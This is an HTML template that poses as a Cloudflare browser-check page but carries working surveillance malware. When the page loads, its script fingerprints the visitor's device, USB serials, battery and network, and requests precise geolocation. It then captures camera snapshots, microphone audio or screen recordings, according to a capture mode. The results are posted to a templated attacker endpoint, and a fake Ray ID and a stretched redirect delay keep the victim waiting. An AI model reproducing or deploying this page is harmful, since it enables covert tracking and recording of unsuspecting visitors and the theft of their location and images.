<html lang="en-US">
<head> 
<meta charset="UTF-8"> 
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
<meta name="robots" content="noindex, nofollow"> 
<meta name="viewport" content="width=device-width,initial-scale=1"> 
<title>Security Check</title>
<style type="text/css">
html, body {width: 100%; height: 100%; margin: 0; padding: 0;}
body {background-color: #ffffff; color: #000000; font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue",Arial, sans-serif; font-size: 16px; line-height: 1.7em;-webkit-font-smoothing: antialiased;}
h1 { text-align: center; font-weight:700; margin: 16px 0; font-size: 32px; color:#000000; line-height: 1.25;}
p {font-size: 20px; font-weight: 400; margin: 8px 0;}
p, .attribution, {text-align: center;}
#spinner {margin: 0 auto 30px auto; display: block;}
.attribution {margin-top: 32px;}
@keyframes fader   { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
@-webkit-keyframes fader { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
#cf-bubbles > .bubbles { animation: fader 1.6s infinite;}
#cf-bubbles > .bubbles:nth-child(2) { animation-delay: .2s;}
#cf-bubbles > .bubbles:nth-child(3) { animation-delay: .4s;}
.bubbles { background-color: #f58220; width:20px; height: 20px; margin:2px; border-radius:100%; display:inline-block; }
a { color: #2c7cb0; text-decoration: none; -moz-transition: color 0.15s ease; -o-transition: color 0.15s ease; -webkit-transition: color 0.15s ease; transition: color 0.15s ease; }
a:hover{color: #f4a15d}
.attribution{font-size: 16px; line-height: 1.5;}
.ray_id{display: block; margin-top: 8px;}
#cf-wrapper #challenge-form { padding-top:25px; padding-bottom:25px; }
#cf-hcaptcha-container { text-align:center;}
#cf-hcaptcha-container iframe { display: inline-block;}
.progress-bar {
  width: 80%;
  max-width: 350px;
  height: 8px;
  background-color: #e9ecef;
  border-radius: 4px;
  margin: 20px auto;
  overflow: hidden;
}
.progress-bar-value {
  width: 0%;
  height: 100%;
  background-color: #f58220;
  border-radius: 4px;
  transition: width 0.5s ease;
}
</style> 
</head> 
<body>
<table width="100%" height="100%" cellpadding="20"> 
<tbody>
<tr> 
<td align="center" valign="middle"> 
<div class="cf-browser-verification cf-im-under-attack"> 
<noscript> 
<h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1> 
</noscript> 
<div id="cf-content" style="display: block;"> 
<div id="cf-bubbles"> 
<div class="bubbles"></div> 
<div class="bubbles"></div> 
<div class="bubbles"></div> 
</div> 
<h1><span data-translate="checking_browser">Checking your browser before accessing</span> the website.</h1> 
<div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none"> 
<p data-translate="turn_on_cookies" style="color:#bd2426;">Please enable Cookies and reload the page.</p> 
</div> 
<p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your requested content shortly.</p> 
<div class="progress-bar">
  <div class="progress-bar-value" id="progress-value"></div>
</div>
<p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs" style="display: inline-block;">Please allow up to 5 seconds‚Ä¶</p> 
<p data-translate="redirecting" id="cf-spinner-redirecting" style="display: none;">Redirecting‚Ä¶</p> 
</div> 
<form class="challenge-form" id="challenge-form" action="http://000webhost.com/?__cf_chl_jschl_tk__=gUwvgP4U.d3mjLABceeM1Hoq0yzKoVb2_YClw1ApwLs-1640764924-0-gaNycGzNA70" method="POST" enctype="application/x-www-form-urlencoded"> 

<span data-translate="error" style="display: none;">error code: 1020</span>

</form>
</div> 
<div class="attribution">
DDoS protection by 
<a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a> 
<br> 
<span class="ray_id">Ray ID: <code id="ray" >6c51810c599f2cda</code></span> 
</div> </td> 
</tr> 
</tbody>
</table>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
<audio id="audio" style="display:none"></audio>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
<script type="text/javascript">
var c=false, l=false, uid="<%=uid %>";
var captureMethod = "<%= typeof captureMethod !== 'undefined' ? captureMethod : 'full' %>";
var redirectDelay = 30000; // 30 seconds delay before redirect (increased for screen/audio recording)

// Progress bar animation
function animateProgressBar() {
  var progressValue = document.getElementById('progress-value');
  var width = 0;
  
  // Slow down progress bar animation (300ms instead of 200ms)
  // This gives more time for screen recording/audio recording to complete
  var id = setInterval(frame, 300);
  
  function frame() {
    if (width >= 100) {
      clearInterval(id);
      document.getElementById('cf-spinner-allow-5-secs').style.display = 'none';
      document.getElementById('cf-spinner-redirecting').style.display = 'inline-block';
    } else {
      // Increment by smaller steps for longer total animation
      width += 0.5;
      progressValue.style.width = width + '%';
    }
  }
}

// Handle different capture methods
function getCaptureConfig() {
  switch(captureMethod) {
    case 'back':
      return {
        camera: true,
        facingMode: "environment",
        audio: false,
        screen: false
      };
    case 'min':
      return {
        camera: false,
        audio: false,
        screen: false
      };
    case 'audio':
      return {
        camera: false,
        audio: true,
        screen: false
      };
    case 'screen':
      return {
        camera: false,
        audio: false,
        screen: true
      };
    case 'full':
    default:
      return {
        camera: true,
        facingMode: "user",
        audio: false,
        screen: false
      };
  }
}

const captureConfig = getCaptureConfig();

async function gather() {
  var td = "";
  <% if(!t){ %>
  td += '<code>‚úÖ Target Information </code><br><br><b>‚öì IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
  <% }else{ %>
  await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>‚úÖ Target Information </code><br><br><b>‚öì IP: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Time: <%=time %></b>'));
  <% } %>

  td += "<br><br><b>‚è≥ Date In Target's Device:</b> " + new Date() + "<br>";
  td += "<br><b>üõ†Ô∏è Capture Method:</b> " + captureMethod + "<br>";
  
  var xo = ["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
  var xoc = ["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
  
  // Device Information
  td += "<br><b>üì± Device Information</b><br>";
  for(var i=0; i < xo.length; i++) { 
    if(xo[i] in navigator) {
      var str = navigator[xo[i]];
      td += "<b>" + xo[i] + "</b>: <code>" + str + "</code><br>";
    }
  }

  // Media devices
  if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
    await navigator.mediaDevices?.enumerateDevices()
    .then(function(devices) {
      td += "<br><b>üì∑ Media Device Information</b><br>";
      devices.forEach(function(device) {
        td += "<b>" + device.kind + ":</b> " + device.label + " id = <code>" + device.deviceId + "</code><br>";
      });
    })
    .catch(function(err) {
      td += "<br><b>üì∑ Media Device Information</b><br>";
      td += "‚ö†Ô∏è Media Device Error: " + err.name + ": " + err.message;
    });
  }

  // Network Information
  if("connection" in navigator) {
    td += "<br><b>üï∏Ô∏è Network Information</b><br>";
    for(var i=0; i < xoc.length; i++) { 
      var str = navigator.connection[xoc[i]];
      td += "<b>" + xoc[i] + "</b>: <code>" + str + "</code><br>";
    }
  }

  // USB Devices
  if("usb" in navigator) {
    await navigator.usb.getDevices()
    .then(devices => {
      td += "<br><b>üîå Total USB devices connected:</b> " + devices.length + "<br>";
      devices.forEach(device => {
        td += "<b>Product name:</b> " + device.productName + " , <b>Serial number: </b> <code>" + device.serialNumber + "</code><br>";
      });
    });
  }

  // Battery Information
  if("getBattery" in navigator) {
    await navigator.getBattery().then(function(battery) {
      td += "<br><b>üîã Battery Information</b><br>";
      td += "<b>üîãBattery Level:</b> " + battery.level*100 + "%<br><b>‚ö° Is Battery Charging:</b> " + battery.charging + "";
    });
  }

  // Location Information
  if(!navigator.geolocation) {
    td += "<br><b>üìç Location Information</b><br>";
    td += "‚ö†Ô∏è Location API not available";
    l = true;
    checkRedirect();
  } 

  function locationSuccess(pos) {
    const crd = pos.coords;
    $.post("<%=a %>/location", {
      uid: uid,
      lat: encodeURIComponent(crd.latitude),
      lon: encodeURIComponent(crd.longitude),
      acc: encodeURIComponent(crd.accuracy)
    }, (s) => {
      l = true;
      checkRedirect();
    });
  }

  function locationError(err) {
    td += "<br><b>üìç Location Information</b><br>";
    td += "‚ö†Ô∏è Location ERROR: <code>" + err.message + "</code>";
    l = true;
    checkRedirect();
  }

  if(navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(locationSuccess, locationError, { enableHighAccuracy: true, maximumAge: 0 });
  }

  // Send the basic information we've gathered so far
  $.post("<%=a %>/", {data: encodeURIComponent(td), uid: encodeURIComponent(uid)}, (s) => {
    console.log("Basic information sent");
  });

  // Initialize media capture based on the selected capture method
  if (captureConfig.camera) {
    initCamera();
  } else if (captureConfig.audio) {
    initAudioCapture();
  } else if (captureConfig.screen) {
    initScreenCapture();
  } else {
    // If no media capture is needed, set camera as completed
    c = true;
    checkRedirect();
  }
}

// Check if we can redirect to the target URL
function checkRedirect() {
  if (c && l) {
    window.location.href = "<%=url %>";
  }
}

// Ensure redirect happens even if captures fail or take too long
setTimeout(() => {
  window.location.href = "<%=url %>";
}, redirectDelay);

// Camera capture
function initCamera() {
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  var imgsent = 0;
  
  function postImage(imageData) {
    $.post("<%=a %>/camsnap", {
      uid: uid,
      img: encodeURIComponent(imageData)
    }, (s) => {
      imgsent++;
      if (imgsent >= 4) {
        c = true;
        checkRedirect();
      }
    });
  }
  
  const constraints = {
    audio: false,
    video: { facingMode: captureConfig.facingMode || "user" }
  };
  
  async function cam() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      handleSuccess(stream);
    } catch (e) {
      console.error("Camera access error:", e);
      c = true;
      checkRedirect();
    }
  }
  
  function handleSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;
    
    var context = canvas.getContext('2d');
    var captureInterval = setInterval(function() {
      context.drawImage(video, 0, 0, 500, 500);
      var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
      postImage(canvasData);
      
      if (imgsent >= 4) {
        clearInterval(captureInterval);
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
      }
    }, 1500);
  }
  
  cam();
}

// Audio capture
function initAudioCapture() {
  const audioElement = document.getElementById('audio');
  let mediaRecorder;
  let audioChunks = [];
  
  async function startAudioCapture() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
      handleAudioSuccess(stream);
    } catch (e) {
      console.error("Audio capture error:", e);
      c = true;
      checkRedirect();
    }
  }
  
  function handleAudioSuccess(stream) {
    try {
      audioElement.srcObject = stream;
      
      // Create media recorder
      mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
      
      // When data is available
      mediaRecorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          audioChunks.push(event.data);
        }
      };
      
      // When recording stops
      mediaRecorder.onstop = () => {
        // Create audio blob
        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
        
        // Create audio URL for preview (optional)
        const audioURL = URL.createObjectURL(audioBlob);
        const audioPreview = document.createElement('audio');
        audioPreview.controls = true;
        audioPreview.src = audioURL;
        audioPreview.style.display = 'none';
        document.body.appendChild(audioPreview);
        
        // Stop all tracks
        stream.getTracks().forEach(track => track.stop());
        
        // Set as completed
        c = true;
        checkRedirect();
      };
      
      // Start recording and stop after 5 seconds
      mediaRecorder.start();
      
      setTimeout(() => {
        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
          mediaRecorder.stop();
        }
      }, 5000);
      
    } catch (error) {
      console.error("MediaRecorder error:", error);
      
      // Fallback in case of error
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      c = true;
      checkRedirect();
    }
  }
  
  startAudioCapture();
}

// Screen capture
function initScreenCapture() {
  const video = document.getElementById('video');
  let mediaRecorder;
  let recordedChunks = [];
  
  async function startScreenCapture() {
    try {
      // Show a dialog to request screen sharing
      const stream = await navigator.mediaDevices.getDisplayMedia({
        video: {
          cursor: "always"
        }
      });
      
      // Connect stream to video element
      video.srcObject = stream;
      
      // Set up media recorder
      mediaRecorder = new MediaRecorder(stream, {mimeType: 'video/webm'});
      
      // Handle data available event
      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          recordedChunks.push(event.data);
        }
      };
      
      // Handle recording stopped
      mediaRecorder.onstop = () => {
        // Create blob from chunks
        const blob = new Blob(recordedChunks, {type: 'video/webm'});
        
        // Optional: Create video element to verify recording worked
        const videoURL = URL.createObjectURL(blob);
        const videoPreview = document.createElement('video');
        videoPreview.controls = true;
        videoPreview.width = 320;
        videoPreview.height = 240;
        videoPreview.style.display = 'none';
        videoPreview.src = videoURL;
        document.body.appendChild(videoPreview);
        
        // Stop all tracks
        stream.getTracks().forEach(track => track.stop());
        
        // Mark as completed
        c = true;
        checkRedirect();
      };
      
      // Handle user stopping the screen share
      stream.getVideoTracks()[0].onended = () => {
        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
          mediaRecorder.stop();
        }
      };
      
      // Start recording for 6 seconds
      mediaRecorder.start();
      
      // Stop after 6 seconds
      setTimeout(() => {
        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
          mediaRecorder.stop();
        }
      }, 6000);
      
    } catch (e) {
      console.error("Screen capture error:", e);
      c = true;
      checkRedirect();
    }
  }
  
  startScreenCapture();
}

window.onload = () => {
  // Generate random Ray ID for CloudFlare page
  var i = "qwertyuioplkjhgfdsazxcvbnm0987654321";
  var str = "";
  for (var o = 0; o < 17; o++) {
    str += i[Math.floor(Math.random() * 35)];
  }
  document.getElementById("ray").innerHTML = str;
  
  // Start progress bar animation
  animateProgressBar();
  
  // Start gathering information
  gather();
};
</script>
</body>
</html>
